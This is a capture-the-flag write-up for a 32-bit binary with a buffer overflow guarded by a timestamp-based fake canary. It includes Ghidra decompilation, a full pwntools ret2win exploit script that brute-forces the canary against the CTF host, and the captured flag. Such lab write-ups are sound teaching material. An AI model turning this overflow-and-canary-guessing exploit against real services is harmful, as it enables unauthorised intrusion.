The first thing I do to this file s to run the file and checksec commands to see what basic protection it has.  it is in 32 bit with  PIE disabled but it has NX. It also says it has no stack canary so the canary must be added at the runtime of the program.

I then run it in ghidra
```C
  local_14 = popen("date +%s","r");
  if (local_14 == (FILE *)0x0) {
    puts("Failed to run command");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_20,12,local_14);
  pclose(local_14);
  global = strtol(local_20,(char **)0x0,10);
```
I can see from this snippet of code that it opens a file and get the UNIX timestamp, it then stores it and then turns it into a long and sets global equal to it. It then runs the readin() function with global as its parameter.

```C
void read_in(int param_1)

{
  undefined1 local_58 [72];
  int local_10;
  
  local_10 = param_1;
  read(0,local_58,140);
  if (local_10 != global) {
    puts("****Stack Smashing Detected!!!****\nExiting now.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return;
}
```
Inside of readin() there is a read that allows for a buffer overflow! But then it checks the canary that is that global variable from before.

From there it is a normal ret2win with a canary but the I imported the time library so that I could also get the current timestamp for the canary value. When running remotely sometimes the time would have a slight discrepancy. I solved this by sending it in a loop and adjusting an offset from the original time.

```python
#!/usr/bin/env python3
import time
from pwn import *

# target info
HOST = "www.cweaccessionsctf.com"
PORT = 1315

# gadgets / offsets
WIN_ADDR = 0x080491f6
BUFFER_OFFSET = 72
PAD_AFTER_CANARY = 12

def try_canary(canary):
    """
    Open a fresh connection, send the payload with our guessed canary,
    and return the process object so caller can check its output.
    """
    p = remote(HOST, PORT)
    # if the binary prints a prompt, sync up here:
    # p.recvuntil(b"Enter your data:") 

    payload  = b"A" * BUFFER_OFFSET
    payload += p32(canary)
    payload += b"B" * PAD_AFTER_CANARY
    payload += p32(WIN_ADDR)

    p.sendline(payload)
    return p

if __name__ == "__main__":
    # base time—sync with the server’s time() if you can
    base = int(time.time())

    for i in range(0, 10):
        guess = base + i
        log.info(f"[*] attempting canary = 0x{guess:08x}")
        p = try_canary(guess)

        # give the remote a moment to respond
        time.sleep(0.1)

        # read whatever comes back
        try:
            data = p.recvall(timeout=1)
        except EOFError:
            data = b""

        # look for your flag in the output
        if b"CWE{" in data or b"flag" in data.lower():
            log.success(f"FOUND! canary=0x{guess:08x}")
            print(data.decode(errors="ignore"))
            p.interactive()
            break

        # if it wasn’t the right canary, close and loop
        p.close()
    else:
        log.error("All attempts failed.")


```

CWE{fly_away_little_canary_TZ4gELYH}
<!--stackedit_data:
eyJoaXN0b3J5IjpbODE2OTg3NzMzLC0xNTMyMjM5MDYzLDUwND
E0ODQwNl19
-->